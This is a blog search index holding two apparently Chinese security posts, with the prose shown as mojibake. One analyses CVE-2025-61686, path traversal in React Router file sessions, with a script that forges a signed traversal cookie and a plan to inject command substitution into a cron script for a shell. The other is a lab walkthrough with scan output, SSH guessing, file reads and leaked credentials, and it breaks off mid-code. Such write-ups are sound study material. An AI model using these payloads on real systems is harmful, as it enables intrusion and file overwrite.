<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>æµ…æCVE-2025-61686-ReactRouter-ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´</title>
      <link href="/2026/02/22/%E6%B5%85%E6%9E%90CVE-2025-61686-ReactRouter-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2026/02/22/%E6%B5%85%E6%9E%90CVE-2025-61686-ReactRouter-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="æ¼æ´ç®€è¿°"><a href="#æ¼æ´ç®€è¿°" class="headerlink" title="æ¼æ´ç®€è¿°"></a>æ¼æ´ç®€è¿°</h2><blockquote><p> CVE-2025-61686 æ˜¯ä¸€ä¸ªå½±å“ React Router å’Œ Remix Run æ¡†æ¶çš„ä¸¥é‡è·¯å¾„éå†æ¼æ´ã€‚è¯¥æ¼æ´å­˜åœ¨äºæ–‡ä»¶ä¼šè¯å­˜å‚¨åŠŸèƒ½ä¸­ï¼Œå½“åº”ç”¨ç¨‹åºä½¿ç”¨<code>createFileSessionStorage()</code>å‡½æ•°ä¸”æœªå¯¹ä¼šè¯ cookie è¿›è¡Œç­¾åæ—¶ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ“çºµä¼šè¯æ ‡è¯†ç¬¦æ¥è®¿é—®æˆ–ä¿®æ”¹æœåŠ¡å™¨æ–‡ä»¶ç³»ç»Ÿä¸Šé¢„æœŸä¼šè¯ç›®å½•ä¹‹å¤–çš„æ–‡ä»¶ã€‚</p></blockquote><p>å½“ç„¶ä½ ç­¾åäº†å¦‚æœå¯ä»¥ä¼ªé€ ä¹Ÿæ˜¯ä¸€æ ·çš„</p><blockquote><p>React Router å’Œ Remix Run æä¾›äº†å¤šç§ä¼šè¯å­˜å‚¨é€‰é¡¹ï¼ŒåŒ…æ‹¬ï¼š</p><ul><li>Cookie ä¼šè¯å­˜å‚¨</li><li>å†…å­˜ä¼šè¯å­˜å‚¨</li><li>æ–‡ä»¶ä¼šè¯å­˜å‚¨</li><li>è‡ªå®šä¹‰ä¼šè¯å­˜å‚¨</li></ul><p><code>createFileSessionStorage()</code>å‡½æ•°å…è®¸å¼€å‘è€…å°†ä¼šè¯æ•°æ®æŒä¹…åŒ–åˆ°æ–‡ä»¶ç³»ç»Ÿï¼Œé€‚ç”¨äºéœ€è¦åœ¨æœåŠ¡å™¨é‡å¯åä¿æŒä¼šè¯çŠ¶æ€çš„åœºæ™¯ã€‚</p></blockquote><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>è¿™é‡Œçš„ç¯å¢ƒæˆ‘æ˜¯åŸºäºHifloweré‚£ä¸ªé¶æœºï¼ˆæºç Hifloweré‚£é‡Œæœ‰ï¼‰è¿›è¡Œåˆ†æåˆ©ç”¨</p><p><img src="/../images/achieve/2026/1/image-20260222125818787.png" alt="image-20260222125818787"></p><p>è¿™é‡Œå®šä¹‰äº†sessionæ–‡ä»¶çš„å‚¨å­˜æ–‡ä»¶å¤¹å’ŒåŠ å¯†ç­¾åç”¨çš„secretsï¼Œå› æ­¤è¿™é‡Œå…¶å®æˆ‘ä»¬å°±æ˜¯å¯ä»¥å»å†™ä¸€ä¸ªä¼ªé€ sessionçš„jsè„šæœ¬äº†</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&quot;crypto&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SECRET</span> = <span class="string">&quot;mazesec&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> encoded = <span class="string">&quot;IjlmYmYwNjFjMWJiY2EwMjYvLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vdGVzdC50eHQi&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// HMAC-SHA256ï¼Œè¾“å‡ºæ™®é€š base64</span></span><br><span class="line"><span class="keyword">let</span> sig = crypto</span><br><span class="line">  .<span class="title function_">createHmac</span>(<span class="string">&quot;sha256&quot;</span>, <span class="variable constant_">SECRET</span>)</span><br><span class="line">  .<span class="title function_">update</span>(encoded)</span><br><span class="line">  .<span class="title function_">digest</span>(<span class="string">&quot;base64&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æœ€ç»ˆ cookie å€¼</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;encoded&#125;</span>.<span class="subst">$&#123;sig&#125;</span>`</span>);</span><br></pre></td></tr></table></figure><p>sessionçš„æ ¼å¼æ˜¯ï¼šå‰åŠéƒ¨åˆ†æ˜¯sessionidçš„base64ç¼–ç ï¼Œåéƒ¨åˆ†æ˜¯åŸºäºå‰åŠéƒ¨åˆ†å’Œsecretçš„ç­¾åï¼Œç‰¹åˆ«æ³¨æ„çš„ä¸€ç‚¹æ˜¯å‰åŠéƒ¨åˆ†çš„sessionidæ˜¯è¦å¸¦åŒå¼•å·å»è¿›è¡Œbase64ç¼–ç çš„</p><p><img src="/../images/achieve/2026/1/image-20260222130519562.png" alt="image-20260222130519562"></p><p>é‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è„šæœ¬å»ä¼ªé€ äº†ä¸€ä¸ªæ¶æ„çš„sessionï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¦æ‰¾å†™å…¥æ–‡ä»¶çš„å‡½æ•°</p><p><img src="/../images/achieve/2026/1/image-20260222130712320.png" alt="image-20260222130712320"></p><p>è¿™ä¸ªcommitSessionï¼Œç„¶åæˆ‘ä»¬æ”¹å¥½sessionè®¿é—®è¿™ä¸ªè·¯ç”±ï¼ŒæˆåŠŸå†™å…¥äº†ï¼Œä½†æ˜¯è¿™é‡Œæˆ‘ä»¬å¹¶æ²¡æœ‰æ§åˆ¶æˆ‘ä»¬æƒ³å†™å…¥çš„å†…å®¹</p><p><img src="/../images/achieve/2026/1/image-20260222131132547.png" alt="image-20260222131132547"></p><p><del>ä½†æ˜¯è¿™ä¸ªå¯ç”¨ç”¨æ¥è¦†ç›–æ–‡ä»¶!</del></p><p>äºæ˜¯æˆ‘ä»¬å»æ‰¾èƒ½æ§åˆ¶å†™å…¥çš„è·¯ç”±</p><p><img src="/../images/achieve/2026/1/image-20260222131924051.png" alt="image-20260222131924051"></p><p>ç™»å½•è¿™ä¸ªé¡µé¢é…åˆæ³¨å†Œï¼Œå¯ä»¥é€šè¿‡å¯¹usernameçš„æ§åˆ¶å†™å…¥ä¸œè¥¿ï¼Œç„¶åå¯¹äºè¿™ä¸ªé¶æœºè¿™é‡Œæ˜¯æœ‰ä¸€ä¸ªå®šæ—¶shellè„šæœ¬çš„ï¼Œæˆ‘ä»¬é…åˆå˜é‡æ›¿æ¢ï¼š<code>$&#123;&#125;</code>æˆ–è€…å‘½ä»¤æ›¿æ¢ï¼šåå¼•å·ï¼Œå»å¼¹ä¸ªshell</p><p><img src="/../images/achieve/2026/1/image-20260222132647692.png"></p><p>å¡«å…¥æ¶æ„sessionå»ç™»å½•å°±å¯ä»¥å†™å…¥æ–‡ä»¶å•¦ï¼æ¥ä¸‹æ¥å°±ä»ä»£ç å±‚é¢æ¥<strong>æµ…æ</strong>ä¸€ä¸‹</p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>æ¥<strong>æµ…æ</strong>ä¸€ä¸‹ï¼Œæ¯•ç«Ÿæ·±äº†æˆ‘ä¹Ÿå¼„ä¸æ¥</p><p>é¦–å…ˆæˆ‘ä»¬è·Ÿè¿›<code>createFileSessionStorage</code></p><p><img src="/../images/achieve/2026/1/image-20260222151449177.png" alt="image-20260222151449177"></p><p>å‘ç°è°ƒç”¨äº†<code>createSessionStorage</code>ï¼Œç»§ç»­è·Ÿè¿›</p><p><img src="/../images/achieve/2026/1/image-20260222151710444.png" alt="image-20260222151710444"></p><p>è¿™é‡Œå°±å¯ä»¥çœ‹åˆ°<code>commitSession</code>çš„å®ç°äº†ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸»è¦å…³æ³¨<code>creatData</code>å’Œ<code>cookie.serialize</code></p><p>å…ˆæ¥çœ‹å‰è€…</p><p><img src="/../images/achieve/2026/1/image-20260222153107429.png" alt="image-20260222153107429"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> randomBytes = crypto.<span class="title function_">getRandomValues</span>(<span class="keyword">new</span> <span class="title class_">Uint8Array</span>(<span class="number">8</span>));</span><br><span class="line"><span class="keyword">let</span> id = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(randomBytes).<span class="title function_">toString</span>(<span class="string">&quot;hex&quot;</span>);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”Ÿæˆä¸€ä¸ª16ä½çš„sessionid</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> file = <span class="title function_">getFile</span>(dir, id);</span><br><span class="line"><span class="keyword">await</span> import_node_fs.<span class="property">promises</span>.<span class="title function_">mkdir</span>(path.<span class="title function_">dirname</span>(file), &#123; <span class="attr">recursive</span>: <span class="literal">true</span> &#125;);</span><br><span class="line"><span class="keyword">await</span> import_node_fs.<span class="property">promises</span>.<span class="title function_">writeFile</span>(file, content, &#123; <span class="attr">encoding</span>: <span class="string">&quot;utf-8&quot;</span>, <span class="attr">flag</span>: <span class="string">&quot;wx&quot;</span> &#125;);</span><br><span class="line"><span class="keyword">return</span> id;</span><br></pre></td></tr></table></figure><p>fileè¿™é‡Œæ˜¯å…ˆå®šä¹‰ä¸€ä¸ªå®Œæ•´çš„è·¯å¾„</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getFile</span>(<span class="params">dir, id</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> path.<span class="title function_">join</span>(dir, id.<span class="title function_">slice</span>(<span class="number">0</span>, <span class="number">4</span>), id.<span class="title function_">slice</span>(<span class="number">4</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å®ƒæŠŠsessionidå‰4ä½æ‹¿å‡ºæ¥ä½œä¸ºäº†ä¸€ä¸ªç›®å½•ï¼Œ<code>path.join()</code> æœªæ‹¦æˆª <code>../</code> ç­‰ã€‚å¯¼è‡´å¸¦æœ‰ç›®å½•ç©¿è¶Šå­—ç¬¦çš„è¾“å…¥èƒ½ç»•è¿‡å­˜å‚¨ç›®å½•çº¦æŸã€‚è¿™é‡Œå°±å¯ä»¥çŸ¥é“ä¸ºä½•å¯ä»¥ç›®å½•ç©¿è¶Šäº†å§</p><p>å…³äºæ¼æ´çš„æ€»ç»“ï¼š</p><ol><li>åªè¦æ˜¯å…·æœ‰å†™çš„æƒé™çš„ç›®å½•ä¸‹å°±å¯ä»¥ä»»æ„æ–‡ä»¶å†™å…¥</li><li>ç¬¬ä¸€ä¸ªæ˜¯æœªä½¿ç”¨ç­¾åï¼Œæˆ–è€…ä½¿ç”¨äº†ç­¾åä½†å¯†é’¥æ³„éœ²å¯ä»¥ä¼ªé€ ï¼Œç¬¬äºŒä¸ªå°±æ˜¯æ„å»ºè·¯å¾„çš„æ—¶å€™åº•å±‚ç”¨çš„æ˜¯<code>path.join()</code>ï¼Œè¿™ä¸ªæœ¬èº«æ˜¯ä¸ä¼šæ‹¦æˆª<code>../</code>ä¹‹ç±»çš„ä¸œè¥¿ã€‚</li></ol>]]></content>
      
      
      <categories>
          
          <category> æ‚é¡¹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nodejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hifloweré¶æœº</title>
      <link href="/2026/02/21/Hiflower%E9%9D%B6%E6%9C%BA/"/>
      <url>/2026/02/21/Hiflower%E9%9D%B6%E6%9C%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="userflag-æ‰“ç‚¹"><a href="#userflag-æ‰“ç‚¹" class="headerlink" title="userflag(æ‰“ç‚¹)"></a>userflag(æ‰“ç‚¹)</h2><p>fscanæ‰«ä¸€ä¸‹</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.20:22 open</span><br><span class="line">192.168.1.20:80 open</span><br><span class="line">192.168.1.20:3000 open</span><br><span class="line">192.168.1.20:8080 open</span><br><span class="line">[*] alive ports len is: 4</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://192.168.1.20       code:200 len:154    title:index</span><br><span class="line">[*] WebTitle http://192.168.1.20:8080  code:200 len:2674   title:ğŸŒ¿ èŠ±å‰çŸ¥è¯†åº“ Wiki</span><br><span class="line">[*] WebTitle http://192.168.1.20:3000  code:200 len:1611   title:Flower App</span><br><span class="line">[+] PocScan http://192.168.1.20:8080 poc-yaml-natshell-arbitrary-file-read</span><br><span class="line">å·²å®Œæˆ 3/4 [-] ssh 192.168.1.20:22 root root@123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">å·²å®Œæˆ 3/4 [-] ssh 192.168.1.20:22 root 123456~a ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">å·²å®Œæˆ 3/4 [-] ssh 192.168.1.20:22 root system ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">å·²å®Œæˆ 3/4 [-] ssh 192.168.1.20:22 admin Admin@123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">å·²å®Œæˆ 3/4 [-] ssh 192.168.1.20:22 admin 123456789 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">å·²å®Œæˆ 3/4 [-] ssh 192.168.1.20:22 admin a123123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">å·²å®Œæˆ 4/4</span><br><span class="line">[*] æ‰«æç»“æŸ,è€—æ—¶: 10m37.7373552s</span><br></pre></td></tr></table></figure><p>sshå¯†ç ä¸€èˆ¬å°è¯•ä¸‰æ¬¡é”™äº†å°±å¾—é‡æ–°è¿æ¥ï¼Œè¿™é‡Œé‡ç‚¹å…³æ³¨8080å’Œ3000ï¼Œå¹¶ä¸”è¿™é‡Œ8080å·²ç»æ‰«å‡ºäº†ä»»æ„æ–‡ä»¶è¯»å–</p><p>&#x2F;etc&#x2F;passwdæœ€åä¸€è¡Œæ•°æ®</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sublarge:x:1001:1001::/home/Sublarge:/bin/bash</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸ªç”¨æˆ·ç›®å½•</p><p><img src="/../images/achieve/2026/1/image-20260221204743211.png" alt="image-20260221204743211"></p><p>ç”±äºæˆ‘æ˜¯ç¬¬ä¸€æ¬¡æ‰“è¿™ç±»é¶æœºï¼Œæ‰€ä»¥å¹¶ä¸æ¸…é™¤flagçš„ä½ç½®ï¼Œæ‰€ä»¥æˆ‘ä¸æ˜¯è¿™æ ·è·å–ç¬¬ä¸€ä¸ªflagçš„ï¼</p><p>é‚£ä¹ˆæˆ‘å°±æ˜¯åˆ°å¤„è¯»è¯»å¹¶çœ‹çœ‹èƒ½ä¸èƒ½å¾—åˆ°ä»€ä¹ˆæœ‰æ•ˆçš„ä¿¡æ¯&#x2F;proc&#x2F;self&#x2F;environ(ä¹‹å‰æ‰“ctfå–œæ¬¢è¯»)</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HOSTNAME=a03b8c7326cf</span><br><span class="line">YARN<span class="built_in">_</span>VERSION=1.22.22</span><br><span class="line">NODE<span class="built_in">_</span>VERSION=20.20.0</span><br><span class="line"></span><br><span class="line">PWD=/app</span><br><span class="line">HOME=/root</span><br><span class="line">SHLVL=0</span><br><span class="line"></span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line"><span class="built_in">_</span>=/usr/local/bin/node</span><br></pre></td></tr></table></figure><p>nodejsï¼Œå·¥ä½œç›®å½•ä¸º&#x2F;app</p><p>æ‰€ä»¥å°è¯•è¯»è¯»ä¸‹é¢çš„æºç </p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/app/index.js</span><br><span class="line">/app/app.js</span><br><span class="line">/app/main.js</span><br><span class="line">/app/server.js</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¯»åˆ°äº†&#x2F;app&#x2F;server.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> http <span class="keyword">from</span> <span class="string">&quot;http&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; createFileSessionStorage &#125; <span class="keyword">from</span> <span class="string">&quot;@react-router/node&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; parse &#125; <span class="keyword">from</span> <span class="string">&quot;querystring&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DONE: cron runs /opt/flower.sh every minute</span></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> create /opt/flower.sh to do something interesting</span></span><br><span class="line"><span class="keyword">const</span> storage = <span class="title function_">createFileSessionStorage</span>(&#123;</span><br><span class="line">  <span class="attr">dir</span>: <span class="string">&quot;./sessions&quot;</span>,</span><br><span class="line">  <span class="attr">cookie</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;session&quot;</span>,</span><br><span class="line">    <span class="attr">httpOnly</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">    <span class="attr">sameSite</span>: <span class="string">&quot;lax&quot;</span>,</span><br><span class="line">    <span class="attr">secrets</span>: [<span class="string">&quot;mazesec&quot;</span>], </span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> users = [];</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">ADMIN_USER</span> = &#123;</span><br><span class="line">  <span class="attr">username</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="attr">password</span>: <span class="string">&quot;Maze-Sec2026&quot;</span>,</span><br><span class="line">  <span class="attr">role</span>: <span class="string">&quot;admin&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> css = <span class="string">`</span></span><br><span class="line"><span class="string">  body &#123; font-family: &#x27;Segoe UI&#x27;, &#x27;Microsoft YaHei&#x27;, sans-serif; background: #fff0f5; color: #4a4a4a; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; &#125;</span></span><br><span class="line"><span class="string">  .container &#123; background: white; padding: 2rem; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 400px; text-align: center; border: 2px solid #ffbed2; &#125;</span></span><br><span class="line"><span class="string">  h1 &#123; color: #d63384; display: flex; align-items: center; justify-content: center; gap: 10px; &#125;</span></span><br><span class="line"><span class="string">  input &#123; display: block; width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box;&#125;</span></span><br><span class="line"><span class="string">  button &#123; background: #ff69b4; color: white; border: none; padding: 10px 20px; border-radius: 20px; cursor: pointer; font-size: 16px; transition: background 0.3s; width: 100%; &#125;</span></span><br><span class="line"><span class="string">  button:hover &#123; background: #d63384; &#125;</span></span><br><span class="line"><span class="string">  .flower-deco &#123; font-size: 40px; margin: 10px 0; &#125;</span></span><br><span class="line"><span class="string">  .links &#123; margin-top: 20px; font-size: 14px; &#125;</span></span><br><span class="line"><span class="string">  a &#123; color: #d63384; text-decoration: none; &#125;</span></span><br><span class="line"><span class="string">  .error &#123; color: red; margin: 10px 0; font-size: 14px; &#125;</span></span><br><span class="line"><span class="string">  .dashboard-content &#123; text-align: left; background: #fffafc; padding: 15px; border-radius: 8px; border: 1px dashed #ffbed2; margin-top: 20px; &#125;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">renderPage</span>(<span class="params">content, title = <span class="string">&quot;Flower App&quot;</span></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">  &lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;title&gt;<span class="subst">$&#123;title&#125;</span>&lt;/title&gt;</span></span><br><span class="line"><span class="string">  &lt;style&gt;<span class="subst">$&#123;css&#125;</span>&lt;/style&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">  &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;flower-deco&quot;&gt;ğŸŒ¸ ğŸŒº ğŸŒ»&lt;/div&gt;</span></span><br><span class="line"><span class="string">    <span class="subst">$&#123;content&#125;</span></span></span><br><span class="line"><span class="string">  &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getBody</span>(<span class="params">req</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> body = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    req.<span class="title function_">on</span>(<span class="string">&quot;data&quot;</span>, <span class="function"><span class="params">chunk</span> =&gt;</span> &#123; body += chunk.<span class="title function_">toString</span>(); &#125;);</span><br><span class="line">    req.<span class="title function_">on</span>(<span class="string">&quot;end&quot;</span>, <span class="function">() =&gt;</span> &#123; <span class="title function_">resolve</span>(<span class="title function_">parse</span>(body)); &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">redirect</span>(<span class="params">res, location, cookie = <span class="literal">null</span></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> headers = &#123; <span class="string">&quot;Location&quot;</span>: location &#125;;</span><br><span class="line">  <span class="keyword">if</span> (cookie) headers[<span class="string">&quot;Set-Cookie&quot;</span>] = cookie;</span><br><span class="line">  res.<span class="title function_">writeHead</span>(<span class="number">302</span>, headers);</span><br><span class="line">  res.<span class="title function_">end</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http.<span class="title 